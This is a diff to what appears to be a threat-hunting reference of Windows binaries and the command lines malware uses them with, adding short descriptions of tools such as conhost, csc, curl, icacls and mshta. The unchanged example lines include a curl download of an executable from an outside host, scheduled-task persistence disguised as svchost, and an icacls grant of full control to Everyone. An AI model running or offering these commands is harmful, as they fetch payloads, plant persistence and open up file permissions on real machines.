@@ -94,7 +94,7 @@ Command  line examples:
     cmstp.exe /s /su /ns df81c455-615e-4add-92e3-ce4a12d882d8.inf
 
 ### conhost.exe
-Function: *//will be add later*
+Function: Host process for the console window. The process sort of sits in the middle between CSRSS and the Command Prompt (cmd.exe)
 
 Command  line examples:
 
@@ -102,14 +102,14 @@ Command  line examples:
     conhost.exe schtasks /create /tn "svchost" /tr "%WINDIR%\resources\svchost.exe" /sc daily /st 17:00 /f
 
 ### csc.exe
-Function: *//will be add later*
+Function:  CSC stands for Visual C# [sharp] Command-Line Compiler.
 
 Command  line examples:
 
     csc.exe /noconfig /fullpaths @"%TEMP%\-h_g5jfn.cmdline"
 
 ### cscript
-Function: *//will be add later*
+Function: Starts a script so that it runs in a command-line environment.
 
 Command  line examples:
 
@@ -125,7 +125,7 @@ Command  line examples:
     csv.exe dic=ngi
 
 ### curl.exe
-Function: *//will be add later*
+Function: A command line tool and library for transferring data with URLs.
 
 Command  line examples:
 
@@ -133,14 +133,14 @@ Command  line examples:
     curl.exe -o pass32.exe http://down.pzchao.com:18559/pass32.exe -u 123:456
 
 ### cvtres.exe
-Function: *//will be add later*
+Function: Windows Resource to Object Converter. It is part of the C++ toolchain to turn resource files (.res) in to compiled objects that can be linked using the linker.
 
 Command  line examples:
 
     cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:%TEMP%\RES1055.tmp" "%TEMP%\CSC1036.tmp"
 
 ### delete
-Function: *//will be add later*
+Function: Delete file
 
 Command  line examples:
 
@@ -156,21 +156,21 @@ Command  line examples:
     devcfg.exe -add net vnet %PROGRAMFILES%\ShrewSoft\VPN Client\drivers\virtualnet.inf
 
 ### dllhost.exe
-Function: *//will be add later*
+Function: COM Surrogate
 
 Command  line examples:
 
     dllhost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}
 
 ### dw20.exe
-Function: *//will be add later*
+Function: The Windows Error Reporting tool, Dw20.exe, collects information automatically whenever an Office program stops responding.
 
 Command  line examples:
 
     dw20.exe -x -s 1080
 
 ### explorer.exe
-Function: *//will be add later*
+Function: Windows shell
 
 Command  line examples:
 
@@ -178,7 +178,7 @@ Command  line examples:
     explorer.exe schtasks /create /tn "svchost" /tr "%WINDIR%\resources\svchost.exe" /sc daily /st 14:59 /f
 
 ### find
-Function: *//will be add later*
+Function: built-in search capabilities
 
 Command  line examples:
 
@@ -190,7 +190,7 @@ Command  line examples:
 
 
 ### findstr
-Function: *//will be add later*
+Function: It is used to search for a specific text string in computer files.
 
 Command  line examples:
 
@@ -200,14 +200,14 @@ Command  line examples:
     findstr.exe findstr /C:"-"
 
 ### icacls
-Function: *//will be add later*
+Function: Displays or modifies discretionary access control lists (DACLs) on specified files, and applies stored DACLs to files in specified directories.
 
 Command  line examples:
 
     icacls . /grant Everyone:F /T /C /Q
 
 ### ipconfig
-Function: *//will be add later*
+Function: Console application of some operating systems that displays all current TCP/IP network configuration values and refresh Dynamic Host Configuration Protocol (DHCP) and Domain Name System (DNS) settings.
 
 Command  line examples:
 
@@ -215,14 +215,14 @@ Command  line examples:
     ipconfig /flushdns
 
 ### javaw.exe
-Function: *//will be add later*
+Function: The javaw.exe command is identical to java.exe, except that with javaw.exe there is no associated console window
 
 Command  line examples:
 
     javaw.exe -jar "C:\07afffd621bd06f571b35fac6266abcec66ca8711102dd9a5e500ee897735190.jar"
 
 ### mshta.exe
-Function: *//will be add later*
+Function: A process which is a part of legitimate Microsoft HTML Application Host for Internet Explorer. This utility executes HTA or HTML files on Windows operating system. 
 
 Command  line examples:
 
